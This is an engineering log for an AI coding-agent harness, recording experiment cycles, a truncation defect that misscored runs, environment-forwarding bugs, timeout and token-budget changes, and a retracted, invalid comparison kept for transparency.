`reflect` ended a run silently at `REPEAT_LIMIT`: the model was never told it was
looping and could not correct. Warn on the 2nd identical call and block only
later, appending the notice to the tool result the model reads next turn -
cache-safe, because tool results are append-only.

`WARN_AFTER = 2` against a read limit of 5, so the nudge arrives three turns before
the run ends. A test pins `WARN_AFTER < min(REPEAT_LIMIT)`; set the other way the
notice is unreachable.

**A defect the morning shipped:** `_signature()` hashes the CALL, so a re-read after
an edit looked identical to a pointless one. It is not - the file changed, so the
result changed. The notice now keys on both.

**Kept, measurement disputed** - see Cycle L.

---

## Cycle K — Verify-on-stop, DEFAULT OFF — `6f198f1`

A run that edits and then stops without running the tests has not finished, it has
narrated. Inject a message and continue; done in `reflect`, bounded at two
nudges.

**Off by default, deliberately.** The plan said build it only once traces showed it
was needed, and they did not: the loop already runs to a turn cap.
`AGENT_VERIFY_ON_STOP` turns it on.

**Never exercised.** Every measurement since ran with it off.

---

## Cycle L — THE DEFECT THAT INVALIDATED THE DAY — `04bcde9`

```
64 scored runs on 2026-08-30
 8 ended with stop_reason = "length"
 8 of those 8 were recorded verdict "done"
 0 of those 8 passed
```

`length` means the provider cut the reply off mid-sentence at `MAX_TOKENS`. It is the
strongest available signal that the model is NOT finished. `reflect` decided `done`
from *"the last message is an assistant message with no tool call"* and never looked
at `stop_reason`, so a truncation and a completion were indistinguishable.

**The trace that exposed it** (`real-humanize` run 1, 12 turns of 30, 4 tests still
failing): the agent had just restated all four assertions with their expected values,
correctly, and was reasoning toward the fix when it hit 16,000 output tokens. That
call billed 30,862 tokens. The run was scored `done`.

**Our own reply cap made it invisible.** The morning's cap truncates stored text to
6,000 chars and appends spill instructions, so in the transcript the reply looks like
a tidy 6,319-char message ending in a normal artifact pointer - not like something
cut off mid-word.

**The fix is a continuation prompt**, with one deliberate difference from the
usual wording: *"continue exactly where you left off"* would here spend
the next 16,000 tokens the same way. Our budget goes on visible reasoning, so the
hint says stop explaining and make the tool call.

**Verified by replaying the real run**, not a synthetic state: that message list
returns `done` without the fix and `continue` with it.

**WHAT THIS COST.** Cycles I, J and the batching cycle were all scored through this.
Their `0/3, zero writes` results were measured on a loop that ended runs while the
agent was mid-sentence. The "seven refuted hypotheses" claim made earlier in the day
is **withdrawn**: only the morning's prompt cycle refuted cleanly, its runs having
ended `stuck` rather than `length`.

---

## Cycle M — Batching independent calls — REVERTED — `a31ad78`, reverted `27d282a`

**Measured first:** across three runs the agent made 20 tool calls in 20 turns. Never
two in one turn. 75-85% of the turn budget went on reads issued one at a time.

The loop already supported batching - verified before writing the prose: three calls
in one turn, gate approves all three, `execute` returns three results, `turns`
increments by 1.

A parallel-tool-call instruction.

**Result: calls/turn stayed at exactly 1.00 across all three runs.** The instruction
was ignored entirely. **REVERTED** - a prompt section the model demonstrably ignores
is cost on every turn for nothing.

---

## Two rig defects, both mine, both invisible to a green suite

**`FORWARDED_ENV` omitted `AGENT_REQUEST_TIMEOUT`** (`55a3bbe`). Every run used the
120s default while the driver believed it had set 240. Three theories were argued
against a number never applied, and `seconds=826` was read as confirming 240 when at
120s with SDK backoff it lands in the same place. Cost: ~90 minutes and four blocked
runs.

The same defect had already been paid for twice - `AGENT_PLAN` (Stage 7) and
`AGENT_WEB` (Stage 4). **The fix reverses the direction of the list**: `config.py`
records every `AGENT_*` name as it reads it through a two-line `_env()` helper, and
the harness derives what it forwards MINUS the three `spawn()` sets itself. An
INCLUSION list fails invisibly; an EXCLUSION list fails visibly. Verified by
reintroducing the defect - the guard names the variable. **It paid the same day:**
`AGENT_MAX_SECONDS` was forwarded automatically with no harness edit.

**The harness stopped running as a script** (`cce2d6f`). Moving that derivation to
module level added `from agent import config`, which works under pytest - the tests
import the file with the repo root already on `sys.path` - and fails under
`python eval/harness.py`, where `sys.path[0]` is `eval/`. **494 tests passed while
the entry point was dead**, and it was pushed. The new test runs
`python eval/harness.py --help` as a SUBPROCESS: exit 1 before the fix, exit 0 after.

Second time in one day a test passed vacuously; the other was a regex guard that
stopped matching after a refactor.

---

## `MAX_SECONDS` 900 -> 1500 — `e0d52e4`

Fixing Cycle L made runs longer, which pushed them into a wall they had never
reached. Derived over 21 real-* runs:

```
seconds per turn   p50 50.9   p90 75.3      tools account for 9-11s of it
cap  900 -> 17.7 turns at p50   <- was
cap 1500 -> 29.5                <- smallest cap that reaches max_turns of 30
cap 1800 -> 35.4                   only the slow tail, 20% more wall clock
```

900 was sized against a hanging tool. It was ending working runs.

---

## The first trustworthy `real-humanize` number of the day

Measured on a loop where truncation does not end runs, the timeout reaches the
container, vanished runs are visible, and the instruments are sound:

```
run 0  stuck  13/30 turns  reads  9  WRITES 0  length recoveries 1  model 965s
run 1  stuck  22/30 turns  reads 16  WRITES 0  length recoveries 2  model 932s
run 2  stuck  21/30 turns  reads 16  WRITES 0  length recoveries 2  model 958s
```

All five truncations recovered correctly. All three then ran out of clock, which is
what `e0d52e4` addresses.

**In every run the agent had all four failing assertions on screen from turn 1, made
9-16 successful reads, had a working `edit_file` that returns a diff, had 8-17 turns
unused - and never edited a file.**

That is the finding the day actually produced. Everything else was apparatus.

---

## Cycles I and J re-measured on the fixed loop — RETRACTED, the experiment was invalid

> **RETRACTED 2026-08-31.** Everything below this line was written in good
> faith and the comparison it rests on does not exist. `be4c772` - a commit
> whose message says "No code in this commit" - had already reverted Cycles I
> and J from `main` by accident, carrying staged reverts across a
> `git checkout`. So the "treatment" arm did not contain the cycles either.
> **Both arms were controls.** The 2-of-2 versus 0-of-3 write split is a
> comparison of a tree against itself plus noise, and means nothing.
>
> The tell was there and was missed: the suite reported 490 tests where it had
> reported 500, and that was attributed to being on the wrong branch rather
> than checked.
>
> **Cycles I and J are therefore UNMEASURED, not negative.** No claim about
> them - helpful, harmful or inert - is supported by anything. The bar for
> citing either is unchanged and now unmet: n=3 on both arms, with the arms
> verified to differ before the runs start.
>
> The code was restored in `1e04dc3`. What survives from below is the CAP
> LADDER section, which was measured independently of this comparison.

<details><summary>The retracted entry, kept because deleting a wrong result hides that it was made</summary>

### (retracted) Cycles I and J re-measured on the fixed loop — NEGATIVE SIGNAL, PARKED

Cycles I (`edit_file` returns a diff) and J (warn before killing, hash the result)
were first scored through the truncation defect of Cycle L, so their `0/3, zero
writes` result described a loop that ended runs while the agent was mid-sentence.
This is the re-measurement, on a loop with that defect fixed and `MAX_SECONDS` at
1500. The control is the same tree with those two cycles reverted and nothing else
changed.

```
CONTROL   (I + J removed)   n=2   WRITES 1, 1     pass 0/2
TREATMENT (I + J present)   n=3   WRITES 0, 0, 0  pass 0/3
```

**The arm WITHOUT the cycles wrote in both runs. The arm with them wrote in none.**

The plausible mechanism is Cycle J. It appends a notice to the result of every
repeated read - extra text on the single tool this agent uses most - and may be
steering the model away from the read-then-edit sequence rather than toward it.
That is a hypothesis about a mechanism, not a measurement of one.

**PARKED, NOT CONCLUDED, and both words are meant.**

n=2 against n=3 does not settle anything on a case that has swung 0/3 -> 1/3 -> 0/3
today on unchanged code. Two runs each writing once is well inside the noise that
produced a single write this morning. Neither arm passed, so the pass rate
contributes nothing.

What stops this being dismissed is the direction and the split: **2 of 2 against 0
of 3**, and it is the first signal all day pointing at something ADDED being
harmful rather than merely useless. Everything else refuted has been inert.

**Why it is parked rather than resolved.** A proper n=3 on both arms is about two
hours of wall clock, because `real-humanize` now takes 20-30 minutes per run - the
truncation fix and the raised `MAX_SECONDS` both let runs go longer. Two hours to
resolve a two-run difference on a case where neither arm passes is poor value
against every other open question.

**The bar for un-parking it:** run both arms at n=3 before either cycle is cited as
working, and revert J first if the split holds. Until then Cycles I and J are
KEPT but UNATTRIBUTED, and neither should be described as having helped.

The control tree is preserved on branch `control-c2c3`.

---

</details>

## The cap ladder, recorded because each fix created the next

Three premature endings in sequence, each uncovered by fixing the one before it:

```
stop_reason=length ended runs at ~12 turns      -> fixed (04bcde9)
MAX_SECONDS 900 ended them at 13-22 turns       -> raised to 1500 (e0d52e4)
BUDGET_TOKENS 400k now ends them at ~20 turns   -> 421,265 observed
```

At roughly 21,000 tokens per turn - this provider caches nothing, so every turn
re-sends the whole history - a 30-turn allowance needs about 630,000 tokens. The
budget permits 19.

**Do not simply raise it.** A run that spent 421,265 tokens to make one edit is not
budget-starved; it is spending its budget on reading, which is the finding that has
survived every cycle today wearing a different verdict each time. Raising the cap
buys more reading.
